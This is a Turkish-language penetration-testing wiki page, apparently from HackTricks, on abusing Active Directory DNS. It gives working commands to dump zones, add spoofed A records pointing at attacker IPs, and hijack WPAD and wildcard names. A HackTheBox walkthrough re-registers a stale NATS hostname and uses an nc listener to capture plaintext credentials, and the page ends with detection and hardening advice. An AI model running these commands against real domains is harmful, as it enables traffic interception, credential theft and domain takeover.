# AD DNS Kayıtları

{{#include ../../banners/hacktricks-training.md}}

Varsayılan olarak Active Directory'deki **herhangi bir kullanıcı**, etki alanı veya orman DNS bölgelerindeki **tüm DNS kayıtlarını**, zone transfer işlemine benzer şekilde **listeleyebilir** (kullanıcılar, AD ortamında bir DNS bölgesinin alt nesnelerini listeleyebilir).

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) aracı, iç ağlarda keşif amacıyla bölgedeki **tüm DNS kayıtlarının** **enumeration** işlemini ve **dışa aktarılmasını** sağlar.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (Nisan 2025), JSON/Greppable (`--json`) çıktısı, çok iş parçacıklı DNS çözümlemesi ve LDAPS'e bağlanırken TLS 1.2/1.3 desteği ekler  

Daha fazla bilgi için [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Kayıt oluşturma / değiştirme (ADIDNS spoofing)

**Authenticated Users** grubu varsayılan olarak zone DACL üzerinde **Create Child** iznine sahip olduğundan, herhangi bir domain hesabı (veya bilgisayar hesabı) ek kayıtlar kaydedebilir. Bu, trafiği ele geçirmek, NTLM relay coercion veya hatta domainin tamamını ele geçirmek için kullanılabilir.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py, Impacket ≥0.12.0 ile birlikte gelir)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Yaygın saldırı bileşenleri

1. **Wildcard record** – `*.<zone>`, AD DNS sunucusunu LLMNR/NBNS spoofing'e benzer şekilde kurumsal çapta yanıt veren bir sunucuya dönüştürür. NTLM hash'lerini yakalamak veya LDAP/SMB'ye relay etmek için kötüye kullanılabilir.  (WINS-lookup'un devre dışı bırakılması gerekir.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – kimlik bilgilerini toplamak için `wpad` ekleyin (veya Global-Query-Block-List'i atlamak amacıyla saldırganın ana makinesini gösteren bir **NS** kaydı ekleyin) ve giden HTTP isteklerini şeffaf proxy üzerinden yönlendirin. Microsoft, wildcard/DNAME atlatma yöntemlerini yamaladı (CVE-2018-8320), ancak **NS-records hâlâ çalışıyor**.<sup>[[1]](#references)</sup>    
3. **Stale entry takeover** – daha önce bir iş istasyonuna ait olan IP adresini alın; ilişkili DNS kaydı hâlâ çözümlenir. Böylece DNS'e hiç dokunmadan kaynak tabanlı kısıtlı delegasyon veya Shadow-Credentials saldırıları mümkün olur.    
4. **DHCP → DNS spoofing** – varsayılan bir Windows DHCP+DNS dağıtımında, aynı alt ağdaki kimliği doğrulanmamış bir saldırgan dinamik DNS güncellemelerini tetikleyen sahte DHCP istekleri göndererek mevcut herhangi bir A kaydının (Domain Controller'lar dâhil) üzerine yazabilir (Akamai “DDSpoof”, 2023). Bu, Kerberos/LDAP trafiği üzerinde machine-in-the-middle olanağı sağlar ve tam etki alanı ele geçirmeye yol açabilir.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – denetiminizdeki bir makine hesabının `dNSHostName` değerini değiştirin, eşleşen bir A kaydı oluşturun ve ardından DC'yi taklit etmek için bu ad adına bir sertifika isteyin. **Certipy** veya **BloodyAD** gibi araçlar bu süreci tamamen otomatikleştirir.  

[Serileştirilmiş hedef bilgileri](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) içeren bir AD DNS kaydı, koşullu bir relay zincirinin parçası olabilir: çağıranın kayıt oluşturma haklarına, hedef bilgisayarın bu ada kimlik doğrulaması yapmasına neden olan bir coercion yoluna ve oluşan kimlik doğrulamayı kabul eden bir relay hedefine ihtiyacı vardır. Hedef protokolü ayrıca değerlendirin; gelen bağlantıdaki SMB signing, HTTPS WinRM hedefinin relay'i kabul edip etmediğini tek başına göstermez. Yama düzeyi, ad işleme, Extended Protection ve hizmet yapılandırması sonucu değiştirebilir.

---

### Eski dinamik kayıtlar üzerinden dahili hizmet ele geçirme (NATS vaka incelemesi)

Dinamik güncellemeler tüm kimliği doğrulanmış kullanıcılara açık kaldığında, **kayıttan kaldırılmış bir hizmet adı yeniden alınabilir ve saldırganın altyapısına yönlendirilebilir**. Mirage HTB DC, DNS scavenging işleminden sonra `nats-svc.mirage.htb` ana makine adını açığa çıkardı; bu nedenle düşük ayrıcalıklı herhangi bir kullanıcı şunları yapabilirdi:<sup>[[3]](#references)</sup>

1. `dig` ile **kaydın eksik olduğunu doğrulayın** ve SOA'yı öğrenin:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Kontrol ettikleri harici/VPN arayüzüne yönlendirecek şekilde kaydı yeniden oluşturun:**

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Düz metin hizmetini taklit edin**. NATS istemcileri kimlik bilgilerini göndermeden önce bir `INFO { ... }` banner'ı görmeyi bekler; bu nedenle gerçek broker'dan meşru bir banner'ı kopyalamak sırları ele geçirmek için yeterlidir:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Adı ele geçirilmiş olan adı çözen her istemci, JSON `CONNECT` frame’ini (`"user"`/`"pass"` dahil) dinleyiciye hemen sızdırır. Saldırgan makinede resmi `nats-server -V` binary’sini çalıştırmak, log redaction’ı devre dışı bırakmak veya oturumu Wireshark ile dinlemek, TLS isteğe bağlı olduğundan aynı düz metin kimlik bilgilerini verir.

4. **Ele geçirilen kimlik bilgileriyle pivot yapın** – Mirage’da çalınan NATS hesabı JetStream erişimi sağladı ve bu erişim, yeniden kullanılabilir AD kullanıcı adları/parolaları içeren geçmiş kimlik doğrulama olaylarını açığa çıkardı.

Bu model, güvenli olmayan TCP handshake’lerine dayanan AD ile tümleşik her hizmet için geçerlidir (HTTP API’leri, RPC, MQTT vb.): DNS kaydı ele geçirildiğinde saldırgan hizmetin kendisi olur.
Broker tarafındaki numaralandırma ve saklanan mesaj iş akışı için bkz. [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Tespit ve sağlamlaştırma

* Hassas zone’larda **Authenticated Users** için *Create all child objects* hakkını reddedin ve dinamik güncellemeleri DHCP’nin kullandığı özel bir hesaba devredin.
* Dinamik güncellemeler gerekiyorsa zone’u **Secure-only** olarak ayarlayın ve yalnızca sahibi olan bilgisayar nesnesinin kendi kaydının üzerine yazabilmesi için DHCP’de **Name Protection** özelliğini etkinleştirin.
* DNS Server 257/252 (dinamik güncelleme), 770 (zone transferi) olay kimliklerini ve `CN=MicrosoftDNS,DC=DomainDnsZones` konumuna yapılan LDAP yazmalarını izleyin.
* Tehlikeli adları (`wpad`, `isatap`, `*`) kasıtlı olarak zararsız bir kayıtla veya Global Query Block List üzerinden engelleyin.
* DNS sunucularını güncel tutun – ör. CVE-2024-26224 ve CVE-2024-26231 RCE açıkları **CVSS 9.8** puanına ulaştı ve Domain Controller’lara karşı uzaktan istismar edilebilir.  



## References

- [1] [ADIDNS Yeniden İncelendi - WPAD, GQBL ve Daha Fazlası](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [DHCP DNS Dinamik Güncellemelerini Kötüye Kullanarak DNS Kayıtlarını Spoof Etme](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: NFS Sızıntılarını Zincirleme, Dinamik DNS Kötüye Kullanımı, NATS Kimlik Bilgilerinin Çalınması, JetStream Sırları ve Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Zone’a Girerken: adidnsdump ile Active Directory DNS’ini dökme](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
